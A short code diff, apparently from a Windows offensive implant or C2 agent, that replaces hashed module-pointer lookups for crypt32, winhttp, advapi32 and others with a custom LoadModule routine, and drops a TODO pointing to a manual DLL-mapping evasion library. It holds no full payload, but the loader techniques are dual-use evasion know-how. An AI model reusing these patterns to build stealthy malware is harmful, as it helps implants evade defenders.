@@ -157,17 +157,12 @@ namespace Main {
 		x_assertb(ctx->modules.kernbase = (HMODULE) M_PTR(KERNELBASE));
 		x_assertb(ctx->modules.shlwapi	= (HMODULE) M_PTR(SHLWAPI));
 
-
-    	// TODO: these will need to be loaded from disk
-        x_assertb(ctx->modules.crypt32  = (HMODULE) M_PTR(CRYPT32));
-        x_assertb(ctx->modules.winhttp  = (HMODULE) M_PTR(WINHTTP));
-        x_assertb(ctx->modules.advapi   = (HMODULE) M_PTR(ADVAPI32));
-        x_assertb(ctx->modules.iphlpapi = (HMODULE) M_PTR(IPHLPAPI));
-        x_assertb(ctx->modules.mscoree  = (HMODULE) M_PTR(MSCOREE));
-        x_assertb(ctx->modules.kernbase  = (HMODULE) M_PTR(KERNBASE));
-
-        // TODO: add dll manual mapping: https://github.com/bats3c/DarkLoadLibrary
-
+        x_assertb(ctx->modules.crypt32  = (HMODULE) LoadModule(LoadLocalFile, CRYPT32));
+        x_assertb(ctx->modules.winhttp  = (HMODULE) LoadModule(LoadLocalFile, WINHTTP));
+        x_assertb(ctx->modules.advapi   = (HMODULE) LoadModule(LoadLocalFile, ADVAPI32));
+        x_assertb(ctx->modules.iphlpapi = (HMODULE) LoadModule(LoadLocalFile, IPHLPAPI));
+        x_assertb(ctx->modules.mscoree  = (HMODULE) LoadModule(LoadLocalFile, MSCOREE));
+        x_assertb(ctx->modules.kernbase  = (HMODULE) LoadModule(KERNBASE));
 
 #pragma region ioapi
 		x_assertb(F_PTR_HMOD(ctx->ioapi.FileTimeToSystemTime, 						ctx->modules.kernel32, FILETIMETOSYSTEMTIME));
